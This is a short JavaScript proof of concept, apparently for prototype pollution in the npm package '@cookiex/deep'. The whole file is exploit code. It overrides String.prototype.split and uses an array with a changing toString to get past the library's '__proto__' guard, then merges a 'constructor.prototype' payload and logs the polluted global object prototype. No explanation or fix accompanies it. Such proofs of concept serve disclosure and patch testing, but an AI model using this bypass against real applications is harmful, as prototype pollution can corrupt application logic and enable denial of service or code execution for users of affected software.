var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const deep = require('@cookiex/deep');
console.log({}.polluted);
const target = {};
deep.default(target, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);